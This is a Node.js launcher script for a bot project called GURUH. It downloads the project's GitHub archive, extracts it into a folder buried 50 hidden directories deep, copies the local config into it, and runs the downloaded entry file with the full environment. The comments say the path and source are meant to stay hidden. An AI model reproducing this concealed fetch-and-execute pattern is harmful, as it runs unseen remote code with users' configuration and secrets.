const fs = require("fs");
const path = require("path");
const axios = require("axios");
const AdmZip = require("adm-zip");
const { spawn } = require("child_process");
const chalk = require("chalk");

// === DEEP HIDDEN TEMP PATH ===
const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);

// === CONFIG (no visible source info) ===
const SOURCE_ARCHIVE = "https://github.com/itsguruu/GURUH/archive/refs/heads/main.zip";
const EXTRACT_FOLDER = path.join(TEMP_DIR, "main-extract");
const LOCAL_CONFIG = path.join(__dirname, "config.js");
const COPIED_CONFIG = path.join(EXTRACT_FOLDER, "config.js");

// === HELPERS ===
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

// === MAIN LOGIC ===
async function fetchAndPrepare() {
  try {
    if (fs.existsSync(TEMP_DIR)) {
      console.log(chalk.yellow("Cleaning cache..."));
      fs.rmSync(TEMP_DIR, { recursive: true, force: true });
    }

    fs.mkdirSync(TEMP_DIR, { recursive: true });

    const archivePath = path.join(TEMP_DIR, "temp.zip");

    console.log(chalk.blue("Connecting to source..."));
    const response = await axios({
      url: SOURCE_ARCHIVE,
      method: "GET",
      responseType: "stream",
    }).catch((err) => {
      console.error(chalk.red("Connection issue:"), err.message);
      throw err;
    });

    await new Promise((resolve, reject) => {
      const writer = fs.createWriteStream(archivePath);
      response.data.pipe(writer);
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    console.log(chalk.green("Source retrieved."));

    try {
      new AdmZip(archivePath).extractAllTo(TEMP_DIR, true);
      console.log(chalk.green("Preparation complete."));
    } catch (e) {
      console.error(chalk.red("Preparation failed:"), e.message);
      throw e;
    } finally {
      if (fs.existsSync(archivePath)) fs.unlinkSync(archivePath);
    }

    // Minimal debug (basenames only)
    console.log(chalk.yellow("Extracted items:"));
    if (fs.existsSync(TEMP_DIR)) {
      fs.readdirSync(TEMP_DIR, { recursive: true }).forEach((item) => {
        console.log("  - " + path.basename(item));
      });
    }

    const pluginsPath = path.join(EXTRACT_FOLDER, "GURUH-main", "plugins");
    if (fs.existsSync(pluginsPath)) {
      console.log(chalk.green("Features ready."));
    } else {
      console.log(chalk.red("Features missing."));
    }
  } catch (e) {
    console.error(chalk.red("Setup failed:"), e);
    throw e;
  }
}

async function applyConfig() {
  if (!fs.existsSync(LOCAL_CONFIG)) {
    console.log(chalk.yellow("No custom config – using default."));
    return;
  }

  try {
    fs.mkdirSync(EXTRACT_FOLDER, { recursive: true });
    fs.copyFileSync(LOCAL_CONFIG, COPIED_CONFIG);
    console.log(chalk.green("Config applied."));
  } catch (e) {
    console.error(chalk.red("Config apply failed:"), e);
  }

  await delay(500);
}

function launchInstance() {
  console.log(chalk.cyan("Starting instance..."));

  if (!fs.existsSync(EXTRACT_FOLDER)) {
    console.error(chalk.red("Extracted content missing."));
    return;
  }

  const repoFolder = path.join(EXTRACT_FOLDER, "GURUH-main");

  if (!fs.existsSync(repoFolder)) {
    console.error(chalk.red("Repo folder not found in extraction."));
    console.log(chalk.yellow("Contents of EXTRACT_FOLDER:"));
    fs.readdirSync(EXTRACT_FOLDER).forEach(f => console.log("  - " + f));
    return;
  }

  const entry = path.join(repoFolder, "index.cjs");

  if (!fs.existsSync(entry)) {
    console.error(chalk.red("Core file missing in repo folder."));
    console.log(chalk.yellow("Files in repo folder:"));
    fs.readdirSync(repoFolder).forEach(f => console.log("  - " + f));
    return;
  }

  console.log(chalk.green("Launching core..."));

  const instance = spawn("node", [path.basename(entry)], {
    cwd: repoFolder,
    stdio: "inherit",
    env: { ...process.env, NODE_ENV: "production" },
  });

  instance.on("close", (code) => {
    console.log(chalk.red(`Instance ended (${code})`));
  });

  instance.on("error", (err) => {
    console.error(chalk.red("Launch failed:"), err);
  });
}

// === EXECUTE ===
(async () => {
  try {
    await fetchAndPrepare();
    await applyConfig();
    launchInstance();
  } catch (e) {
    console.error(chalk.red("Critical failure:"), e);
    process.exit(1);
  }
})();
